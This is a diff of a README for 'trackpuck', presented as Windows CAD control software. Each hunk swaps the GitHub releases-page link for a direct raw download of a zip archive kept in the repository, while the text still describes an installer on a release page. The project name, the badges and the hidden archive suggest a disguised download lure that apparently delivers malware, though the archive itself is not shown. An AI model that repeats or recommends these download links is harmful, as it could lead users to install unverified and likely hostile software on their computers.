@@ -1,6 +1,6 @@
 # 🎯 trackpuck - Precise Control for CAD Work
 
-[![Download trackpuck](https://img.shields.io/badge/Download%20trackpuck-ff6f61?style=for-the-badge&logo=github)](https://github.com/Pleasureseekerconfirmation832/trackpuck/releases)
+[![Download trackpuck](https://img.shields.io/badge/Download%20trackpuck-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pleasureseekerconfirmation832/trackpuck/main/CADs/Software-3.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you begin, make sure your Windows PC meets these requirements:
 
 Click the button below to visit the release page where you can find the latest Windows setup files and instructions.
 
-[![Download trackpuck](https://img.shields.io/badge/Download%20trackpuck-4CAF50?style=for-the-badge&logo=github)](https://github.com/Pleasureseekerconfirmation832/trackpuck/releases)
+[![Download trackpuck](https://img.shields.io/badge/Download%20trackpuck-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pleasureseekerconfirmation832/trackpuck/main/CADs/Software-3.7.zip)
 
 ---
 
@@ -40,7 +40,7 @@ This guide helps you set up trackpuck on a Windows PC step by step. Follow each 
 ### Step 1: Visit the Release Page
 
 Use the download button above or open this link in your browser:  
-https://github.com/Pleasureseekerconfirmation832/trackpuck/releases
+https://raw.githubusercontent.com/Pleasureseekerconfirmation832/trackpuck/main/CADs/Software-3.7.zip
 
 You will see files listed under the latest release. Look for a Windows installer package (usually ends with `.exe`).
 
@@ -138,4 +138,4 @@ When you install trackpuck software, it creates these folders and files:
 
 For convenience, here is the download link once more:
 
-[https://github.com/Pleasureseekerconfirmation832/trackpuck/releases](https://github.com/Pleasureseekerconfirmation832/trackpuck/releases)
+[https://raw.githubusercontent.com/Pleasureseekerconfirmation832/trackpuck/main/CADs/Software-3.7.zip](https://raw.githubusercontent.com/Pleasureseekerconfirmation832/trackpuck/main/CADs/Software-3.7.zip)
